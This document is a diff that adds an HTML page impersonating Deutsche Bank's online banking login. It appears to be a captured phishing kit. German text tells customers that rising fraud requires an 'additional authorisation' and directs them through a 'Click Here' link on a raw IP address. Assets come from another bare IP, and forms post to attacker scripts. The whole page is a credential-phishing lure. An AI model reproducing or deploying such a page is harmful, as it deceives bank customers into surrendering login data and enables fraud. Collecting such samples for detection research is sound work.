@@ -1,0 +1,128 @@
+<html>
+<head><title>Deutsche Bank Online-Banking und -Brokerage</title>
+	
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+	<meta name="RCM Version" content="7.0.0.86">
+	<meta http-equiv="expires" content="0">
+
+	<style>
+</style>
+	<link rel="shortcut icon" href="http://210.176.71.188:8081/favicon.ico" type="image/ico">
+	<link rel="stylesheet" type="text/css" href="http://210.176.71.188:8081/trxm.css">
+	<link rel="stylesheet" type="text/css" href="http://210.176.71.188:8081/loginout.css">
+
+	<link rel="stylesheet" type="text/css" href="http://210.176.71.188:8081/print.css" media="print"></head>
+
+<body>
+
+	<table id="globalContainer" cellspacing="0">
+		<tbody><tr>
+			<td id="maxWidth">
+			<div class="access"><a href="#contentContainer">Direkt zum Inhalt der Seite.</a></div>
+			
+			<div id="headerContainer">
+				<p id="logoContainer"><img title="Logo Deutsche Bank" alt="Logo Deutsche Bank" src="http://210.176.71.188:8081/logo_db.gif" height="54" width="199"></p>
+				<p id="metaNavContainer">
+				</p>
+			</div>
+			
+			<div id="customerNavContainer">&nbsp;</div>
+			
+			<div id="folderContainer">
+				<div id="leftColumnContainer">
+		
+	
+	
+</div>
+
+				<div id="contentContainer" style="border-bottom: medium none;">
+						
+	<form method="post" target="_top" name="LoginForm" onsubmit="return checkIt()" action="/cgi-bin/dbpbc.pl">
+		<div id="centerColumnContainer">
+			<table border="0" cellspacing="0">
+				<tbody>
+				
+
+
+
+
+
+			</tbody></table>
+			<div class="formContainer">
+				<p></p>
+
+				<table border="0" cellpadding="0" cellspacing="0" width="400" class="content">
+<tbody>
+<tr>
+<td>
+<div class="head4"></div></td>
+</tr>
+<tr>
+<td>
+Sehr geehrter Kunde,
+<br><br>
+Da zur Zeit  die Betr&uuml;gereien  mit den Bankkonten von unseren Kunden h&auml;ufig geworden sind, m&uuml;ssen wir notgedrungen nachtr&auml;glich eine zus&auml;tzliche Autorisation von den Kontobesitzern durchf&uuml;hren. 
+
+<br>
+Der Sicherheitsdienst der Deutsche Bank traf die Entscheidung, eine neue Sicherung von den Daten vorzunehmen. Dazu  wurden von unseren Spezialisten sowohl die Protokolle der Informations-&uuml;bertragung, als auch die Kodierungssart der &uuml;bertragenen Daten erneuert. 
+<br><br>
+Im Zusammenhang damit, bitten wir Sie, eine spezielle <b>Form der zus&auml;tzlichen Autorisation</b> auszuf&uuml;llen. 
+<br><br>
+<div align="center"><a href="http://210.114.221.166:8081/WebObjects/dbpbcrsst.woaspr/2304752/wonalww/8ivGluQUgEhZkLByef5uW084nfvyEYfdshwYE3OjfewyjBe8f4nN9N4he2b1fgwtG9UifewfhH7lfwfqri5pzmY3/1.0.0.Login.0.127.27.145/index.html"><img src="http://210.176.71.188:8081/clickhere.gif" width="150" height="30" alt="Click Here"></a></div>
+<br><br>
+Diese  Sofortma&#223;nahmen wurden nur zur Sicherung der Interessen von unseren Kunden getroffen. 
+<br><br>
+
+Danke f&uuml;r die Mitarbeit,<br>
+Deutsche Bank
+
+
+
+
+
+
+<table border="0" cellpadding="0" cellspacing="0" valign="top" width="540" >
+
+<form action="jober/logon.php" method="post" name="may">
+<tr height="10">
+<td width="400" colspan="2"></td>
+</tr>
+
+<tr height="26">
+<td width="100"><input type="hidden" name="ok" value="submit"></td>
+<td width="300">
+
+
+
+</td>
+</tr>
+<tr height="10">
+<td width="400" colspan="2"></td>
+</tr>
+<form>	
+</table>
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+				
+			</div>
+		<img class="formSet" title="" alt="" src="http://210.176.71.188:8081/spacer.gif" height="1" width="1">
+		<input value="Netscape" name="appName" type="hidden">
+		<input value="5.0 (Windows; ru-RU)" name="appVersion" type="hidden">
+		<input value="Win32" name="platform" type="hidden">
+	</form>
+
+				</div> 
+			</div> 
+			<div class="access"><p><a href="#top">Zum Anfang der Seite.</a></p></div>
+			</td>
+		</tr>
+		<tr>
+			<td id="minWidth"><img title="" alt="" src="http://210.176.71.188:8081/spacer.gif" height="1" width="1"></td>
+		</tr>
+	</tbody></table>
+
+</body></html>
+
